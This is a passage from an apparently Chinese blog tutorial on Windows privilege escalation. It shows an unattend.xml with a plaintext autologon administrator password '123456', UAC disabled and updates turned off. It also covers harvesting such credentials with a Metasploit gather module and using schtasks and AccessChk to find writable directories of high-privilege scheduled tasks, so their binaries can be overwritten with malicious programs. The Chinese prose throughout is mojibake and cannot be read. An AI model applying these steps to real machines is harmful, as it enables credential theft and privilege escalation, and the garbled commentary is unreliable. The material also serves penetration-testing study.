<span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-International-Core&quot;</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;x86&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span> <span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">InputLocale</span>&gt;</span>zh-cn<span class="hljs-tag">&lt;/<span class="hljs-name">InputLocale</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">UILanguage</span>&gt;</span>zh-cn<span class="hljs-tag">&lt;/<span class="hljs-name">UILanguage</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">UserLocale</span>&gt;</span>zh-cn<span class="hljs-tag">&lt;/<span class="hljs-name">UserLocale</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-International-Core&quot;</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span> <span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">InputLocale</span>&gt;</span>zh-cn<span class="hljs-tag">&lt;/<span class="hljs-name">InputLocale</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">UILanguage</span>&gt;</span>zh-cn<span class="hljs-tag">&lt;/<span class="hljs-name">UILanguage</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">UserLocale</span>&gt;</span>zh-cn<span class="hljs-tag">&lt;/<span class="hljs-name">UserLocale</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-Shell-Setup&quot;</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;x86&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span> <span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">RegisteredOwner</span>&gt;</span>administrator<span class="hljs-tag">&lt;/<span class="hljs-name">RegisteredOwner</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">OOBE</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">HideEULAPage</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">HideEULAPage</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">NetworkLocation</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">NetworkLocation</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">ProtectYourPC</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">ProtectYourPC</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">HideWirelessSetupInOOBE</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">HideWirelessSetupInOOBE</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SkipMachineOOBE</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">SkipMachineOOBE</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SkipUserOOBE</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">SkipUserOOBE</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">OOBE</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">DisableAutoDaylightTimeSet</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">DisableAutoDaylightTimeSet</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">FirstLogonCommands</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SynchronousCommand</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">RequiresUserInput</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">RequiresUserInput</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Description</span>&gt;</span>Disable Auto Updates<span class="hljs-tag">&lt;/<span class="hljs-name">Description</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">CommandLine</span>&gt;</span>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update&quot; /v AUOptions /t REG_DWORD /d 1 /f<span class="hljs-tag">&lt;/<span class="hljs-name">CommandLine</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">SynchronousCommand</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SynchronousCommand</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Description</span>&gt;</span>Control Panel View<span class="hljs-tag">&lt;/<span class="hljs-name">Description</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">CommandLine</span>&gt;</span>reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel&quot; /v StartupPage /t REG_DWORD /d 1 /f<span class="hljs-tag">&lt;/<span class="hljs-name">CommandLine</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">RequiresUserInput</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">RequiresUserInput</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">SynchronousCommand</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SynchronousCommand</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Description</span>&gt;</span>Control Panel Icon Size<span class="hljs-tag">&lt;/<span class="hljs-name">Description</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">RequiresUserInput</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">RequiresUserInput</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">CommandLine</span>&gt;</span>reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel&quot; /v AllItemsIconView /t REG_DWORD /d 0 /f<span class="hljs-tag">&lt;/<span class="hljs-name">CommandLine</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">SynchronousCommand</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SynchronousCommand</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">RequiresUserInput</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">RequiresUserInput</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">CommandLine</span>&gt;</span>cmd /C wmic useraccount where name=&quot;administrator&quot; set PasswordExpires=false<span class="hljs-tag">&lt;/<span class="hljs-name">CommandLine</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Description</span>&gt;</span>Password Never Expires<span class="hljs-tag">&lt;/<span class="hljs-name">Description</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">SynchronousCommand</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">FirstLogonCommands</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">AutoLogon</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Password</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Value</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">Value</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">PlainText</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">PlainText</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">Password</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Enabled</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Enabled</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Username</span>&gt;</span>administrator<span class="hljs-tag">&lt;/<span class="hljs-name">Username</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">AutoLogon</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">UserAccounts</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">LocalAccounts</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">LocalAccount</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Password</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Value</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">Value</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">PlainText</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">PlainText</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">Password</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Description</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Description</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">DisplayName</span>&gt;</span>administrator<span class="hljs-tag">&lt;/<span class="hljs-name">DisplayName</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Group</span>&gt;</span>Administrators<span class="hljs-tag">&lt;/<span class="hljs-name">Group</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Name</span>&gt;</span>administrator<span class="hljs-tag">&lt;/<span class="hljs-name">Name</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">LocalAccount</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">LocalAccounts</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">UserAccounts</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-Shell-Setup&quot;</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span> <span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">RegisteredOwner</span>&gt;</span>administrator<span class="hljs-tag">&lt;/<span class="hljs-name">RegisteredOwner</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">OOBE</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">HideEULAPage</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">HideEULAPage</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">NetworkLocation</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">NetworkLocation</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">ProtectYourPC</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">ProtectYourPC</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">HideWirelessSetupInOOBE</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">HideWirelessSetupInOOBE</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SkipMachineOOBE</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">SkipMachineOOBE</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SkipUserOOBE</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">SkipUserOOBE</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">OOBE</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">DisableAutoDaylightTimeSet</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">DisableAutoDaylightTimeSet</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">FirstLogonCommands</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SynchronousCommand</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">RequiresUserInput</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">RequiresUserInput</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Description</span>&gt;</span>Disable Auto Updates<span class="hljs-tag">&lt;/<span class="hljs-name">Description</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">CommandLine</span>&gt;</span>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update&quot; /v AUOptions /t REG_DWORD /d 1 /f<span class="hljs-tag">&lt;/<span class="hljs-name">CommandLine</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">SynchronousCommand</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SynchronousCommand</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Description</span>&gt;</span>Control Panel View<span class="hljs-tag">&lt;/<span class="hljs-name">Description</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">CommandLine</span>&gt;</span>reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel&quot; /v StartupPage /t REG_DWORD /d 1 /f<span class="hljs-tag">&lt;/<span class="hljs-name">CommandLine</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">RequiresUserInput</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">RequiresUserInput</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">SynchronousCommand</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SynchronousCommand</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Description</span>&gt;</span>Control Panel Icon Size<span class="hljs-tag">&lt;/<span class="hljs-name">Description</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">RequiresUserInput</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">RequiresUserInput</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">CommandLine</span>&gt;</span>reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel&quot; /v AllItemsIconView /t REG_DWORD /d 0 /f<span class="hljs-tag">&lt;/<span class="hljs-name">CommandLine</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">SynchronousCommand</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SynchronousCommand</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Order</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">Order</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">RequiresUserInput</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">RequiresUserInput</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">CommandLine</span>&gt;</span>cmd /C wmic useraccount where name=&quot;administrator&quot; set PasswordExpires=false<span class="hljs-tag">&lt;/<span class="hljs-name">CommandLine</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Description</span>&gt;</span>Password Never Expires<span class="hljs-tag">&lt;/<span class="hljs-name">Description</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">SynchronousCommand</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">FirstLogonCommands</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">AutoLogon</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Password</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Value</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">Value</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">PlainText</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">PlainText</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">Password</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Enabled</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Enabled</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Username</span>&gt;</span>administrator<span class="hljs-tag">&lt;/<span class="hljs-name">Username</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">AutoLogon</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">UserAccounts</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">LocalAccounts</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">LocalAccount</span> <span class="hljs-attr">wcm:action</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Password</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Value</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">Value</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">PlainText</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">PlainText</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">Password</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Description</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Description</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">DisplayName</span>&gt;</span>administrator<span class="hljs-tag">&lt;/<span class="hljs-name">DisplayName</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Group</span>&gt;</span>Administrators<span class="hljs-tag">&lt;/<span class="hljs-name">Group</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">Name</span>&gt;</span>administrator<span class="hljs-tag">&lt;/<span class="hljs-name">Name</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">LocalAccount</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">LocalAccounts</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">UserAccounts</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">settings</span> <span class="hljs-attr">pass</span>=<span class="hljs-string">&quot;offlineServicing&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-LUA-Settings&quot;</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;x86&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span> <span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">EnableLUA</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">EnableLUA</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">settings</span> <span class="hljs-attr">pass</span>=<span class="hljs-string">&quot;offlineServicing&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Microsoft-Windows-LUA-Settings&quot;</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">&quot;amd64&quot;</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;neutral&quot;</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">&quot;nonSxS&quot;</span> <span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">EnableLUA</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">EnableLUA</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">unattend</span>&gt;</span></code></pre>

<p>æ”¾å…¥ç›®å½•ï¼š<code>C:\Windows\System32\sysprep</code>ä¸‹ï¼Œä¹‹åæ‰§è¡Œå‘½ä»¤é‡å¯å³å¯ï¼š</p>
<pre><code class="hljs powershell">sysprep /generalize /oobe /shutdown /unattend:unattend.xml</code></pre>

<p>ä¸»è¦å…³æ³¨è¯¥æ–‡ä»¶ä¸­å­˜åœ¨çš„è´¦æˆ·ä»¥åŠå¯†ç (æ˜æ–‡æˆ–è€…<code>base64</code>ç¼–ç )ï¼Œå¯ä»¥ä½¿ç”¨<code>metasploit</code>æ¨¡å—<code>post/windows/gather/enum_unattend</code>:</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220125014428626.png" alt="image-20220125014428626"></p>
<p>è™½ç„¶é…ç½®äº†å¯†ç ï¼Œä½†æ˜¯å¥½åƒæ²¡ç”Ÿæ•ˆï¼Œæ‰€ä»¥å°±æ˜¯ç©ºå¯†ç äº†ã€‚</p>
<h3 id="4-2-5-è®¡åˆ’ä»»åŠ¡"><a href="#4-2-5-è®¡åˆ’ä»»åŠ¡" class="headerlink" title="4.2.5 è®¡åˆ’ä»»åŠ¡"></a>4.2.5 è®¡åˆ’ä»»åŠ¡</h3><p>æŸ¥è¯¢è®¡åˆ’ä»»åŠ¡ï¼š</p>
<pre><code class="hljs powershell"><span class="hljs-comment">#è‹±æ–‡</span>
schtasks /query /fo LIST /v | findstr /C:<span class="hljs-string">&quot;Task To Run&quot;</span> | findstr <span class="hljs-string">&quot;.exe&quot;</span>
<span class="hljs-comment">#ä¸­æ–‡</span>
schtasks /query /fo LIST /v | findstr /C:<span class="hljs-string">&quot;è¦è¿è¡Œçš„ä»»åŠ¡&quot;</span> | findstr <span class="hljs-string">&quot;.exe&quot;</span></code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220125153001541.png" alt="image-20220125153001541"></p>
<p><code>AccessChk</code> æ˜¯ <code>SysInterals</code> å¥—ä»¶ä¸­çš„ä¸€ä¸ªå·¥å…·ï¼Œç”±<code>MarkRussinovich</code>ç¼–å†™ï¼Œç”¨äºåœ¨Windowsä¸­è¿›è¡Œä¸€äº›ç³»ç»Ÿæˆ–ç¨‹åºçš„é«˜çº§æŸ¥è¯¢ã€ç®¡ç†å’Œæ•…éšœæ’é™¤å·¥ä½œï¼Œ<code>AccessChk</code>ä¸‹è½½åœ°å€:<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p>
<p>ç”±äºæ€æ¯’è½¯ä»¶çš„æ£€æµ‹ç­‰ï¼Œæ”»å‡»è€…ä¼šå°½é‡é¿å…æ¥è§¦ç›®æ ‡æœºå™¨çš„ç£ç›˜ã€‚è€Œ<code>AccessChk</code>æ˜¯å¾®è½¯å®˜æ–¹æä¾›çš„å·¥å…·ï¼Œä¸€èˆ¬ä¸ä¼šå¼•èµ·æ€æ¯’è½¯ä»¶çš„æŠ¥è­¦ï¼Œæ‰€ä»¥ç»å¸¸ä¼šè¢«æ”»å‡»è€…åˆ©ç”¨ã€‚<strong>å¦‚æœæ”»å‡»è€…å¯¹ä»¥é«˜æƒé™è¿è¡Œçš„ä»»åŠ¡æ‰€åœ¨çš„ç›®å½•å…·æœ‰å†™æƒé™ï¼Œå°±å¯ä»¥ä½¿ç”¨æ¶æ„ç¨‹åºè¦†ç›–åŸæ¥çš„ç¨‹åºã€‚</strong>è¿™æ ·ï¼Œåœ¨è®¡åˆ’ä»»åŠ¡ä¸‹æ¬¡æ‰§è¡Œæ—¶ï¼Œå°±ä¼šä»¥é«˜æƒé™æ¥è¿è¡Œæ¶æ„ç¨‹åºã€‚ç¬¬ä¸€æ¬¡è¿è¡Œ<code>SysIntemals</code>å·¥å…·åŒ…é‡Œçš„å·¥å…·æ—¶ï¼Œä¼šå¼¹å‡ºä¸€ä¸ªè®¸å¯åè®®å¯¹è¯æ¡†ã€‚åœ¨è¿™é‡Œï¼Œå¯ä»¥ä½¿ç”¨å‚æ•° <code>/accepteula</code> è‡ªåŠ¨æ¥å—è®¸å¯åè®®ï¼Œå‘½ä»¤å¦‚ä¸‹ã€‚</p>
<pre><code class="hljs powershell"><span class="hljs-comment">#è‡ªåŠ¨æ¥å—è®¸å¯åè®®</span>
accesschk.exe /accepteula
<span class="hljs-comment">#æŸ¥çœ‹æŒ‡å®šç›®å½•çš„æƒé™é…ç½®æƒ…å†µ</span>
accesschk.exe <span class="hljs-literal">-dqv</span> <span class="hljs-string">&quot;C:\Microsoft&quot;</span> /accepteula
<span class="hljs-comment">#æŸ¥çœ‹Everyoneå¸æˆ·å¯¹C:\ä¸‹çš„æƒé™é…ç½®æƒ…å†µ</span>
accesschk.exe <span class="hljs-literal">-uwq</span> <span class="hljs-string">&quot;Everyone&quot;</span> c:\
